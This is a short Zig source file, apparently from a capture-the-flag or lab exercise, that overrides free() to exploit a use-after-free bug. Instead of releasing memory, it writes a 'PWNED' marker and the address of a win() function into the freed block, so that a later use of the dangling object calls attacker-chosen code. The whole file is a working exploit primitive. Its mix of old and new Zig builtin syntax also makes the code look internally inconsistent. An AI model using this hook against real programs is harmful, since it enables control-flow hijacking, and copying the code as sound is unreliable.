const std = @import("std");

extern fn win() void;

export fn free(ptr: ?*anyopaque) callconv(.C) void {
    if (ptr == null) return;
    
    // Print that we're hooked
    const msg = "[Zig] free() intercepted - planting payload!\n";
    _ = std.posix.write(2, msg) catch {};
    
    // Simple fake object layout (32 bytes name + 8 bytes func pointer)
    const fake_obj = @ptrCast(*align(1) [40]u8, @alignCast(@intFromPtr(ptr.?)));
    
    // Write "PWNED"
    const pwned = "PWNED_BY_ZIG";
    @memcpy(fake_obj[0..pwned.len], pwned);
    
    // Write win() function pointer at offset 32
    const win_addr = @intFromPtr(@ptrCast(*const fn () callconv(.C) void, win));
    const win_bytes = std.mem.asBytes(&win_addr);
    @memcpy(fake_obj[32..40], win_bytes);
    
    const msg2 = "[+] Payload planted at freed memory!\n";
    _ = std.posix.write(2, msg2) catch {};
}
